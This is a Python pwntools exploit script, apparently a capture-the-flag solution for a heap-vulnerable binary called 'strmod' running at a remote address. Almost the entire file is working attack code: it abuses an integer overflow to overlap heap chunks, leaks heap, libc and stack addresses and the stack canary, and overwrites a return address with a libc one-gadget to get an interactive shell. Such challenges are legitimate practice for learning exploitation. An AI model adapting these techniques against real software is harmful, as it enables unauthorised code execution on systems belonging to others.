#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '168.119.108.148', 12010
binary = './strmod'
brkpts = '''
c
'''

elf = ELF("strmod")
libc = ELF("libc-2.31.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc-2.31.so'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.31.so'})

def choice(idx):
    sla("> ", str(idx))

def get(idx):
    choice(1)
    sla("idx = ", str(idx))

def set(idx, data = ""):
    choice(2)
    sla("idx = ", str(idx))
    sla("data = ", data[:0x1e])

if __name__ == "__main__":
    # Setup integer overflow
    sla("Name: ", "a"*8 + p64(0x31)[:6])
    sla("n = ", str(0x7fffffff))
    
    set(0)
    set(1)
    # Spray fake chunk sizes
    set(3, p64(0x31)*4)

    # Leak heap
    get(0)
    reu("vec.get(idx) -> ")
    heap = uu64(rl().strip("\n")) - 0x320

    log.info("heap @ "+hex(heap))

    set(0)
    set(5, p64(heap + 0x2c0))

    # Setup overlap
    set(4, p64(heap + 0x340)[:7])
    set(0x1b)

    # Fake unsorted size
    set(6, p64(heap + 0x350) + p64(0x421))

    # Spray to setup unsorted free conditions
    for i in range(20):
        set(0x100+i)

    # Libc leak (free 0x421 unsorted)
    set(0)
    get(0x13)
    reu("vec.get(idx) -> ")
    libc.address = uu64(rl().strip("\n")) - 0x1ebbe0

    log.info("libc @ "+hex(libc.address))
    free_hook = libc.symbols['__free_hook']
    system = libc.symbols['system']
    environ = libc.symbols['environ']

    # Leak stack via environ
    set(100, p64(environ))
    get(0x15)
    reu("vec.get(idx) -> ")
    stack = uu64(rl().strip("\n")) - 0x118
    canary_addr = stack + 8

    log.info("stack @ "+hex(stack))

    # Leak canary using stack
    set(101, p64(canary_addr + 1)) 
    get(0x1b)
    reu("vec.get(idx) -> ")
    canary = uu64("\x00" + rl().strip("\n")[:7])

    log.info("canary @ "+hex(canary))

    # Fake stack and vector chunks
    set(102, p64(stack))
    set(103, p64(heap + 0x2a0))

    gadget = libc.address + 0xe6c81

    # Fake chunk on stack
    payload = flat([
        0, canary, 0, gadget
    ])

    set(0x21)
    set(105, payload)

    set(0x27)

    # Clear vector chunk cookie
    set(0, p64(heap + 0x588))

    gdb.attach(io, brkpts)
    
    choice(3)

    io.interactive()
